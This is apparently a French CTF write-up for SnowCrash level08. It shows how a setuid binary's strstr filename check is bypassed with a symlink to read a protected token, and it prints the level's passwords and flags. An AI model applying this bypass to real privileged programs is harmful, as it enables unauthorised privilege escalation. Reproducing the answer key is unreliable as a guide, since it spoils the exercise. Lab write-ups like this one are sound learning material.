# LEVEL 08

**LOGIN: level08**

**PASSWORD: fiumuikeil55xe9cu4dood66h**

 ----
 
 ```
 ls -l ; echo ; file level08
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
```
```
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
level08@SnowCrash:~$ echo toto > test
level08@SnowCrash:~$ ./level08 test
toto

```

Le binaire `level08` permet de lire le contenu d'un fichier, mais il y'a une sécurité protegeant le fichier `token`...

```
ltrace ./level08 token 
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                              = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)          = 27
exit(1 <unfinished ...>
```

... apparement un simple `strstr` sur le nom du fichier. 

```
level08@SnowCrash:~$ ln -s token exploit
level08@SnowCrash:~$ ./level08 exploit
quif5eloekouj29ke0vouxean
```
```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

**TOKEN: quif5eloekouj29ke0vouxean**



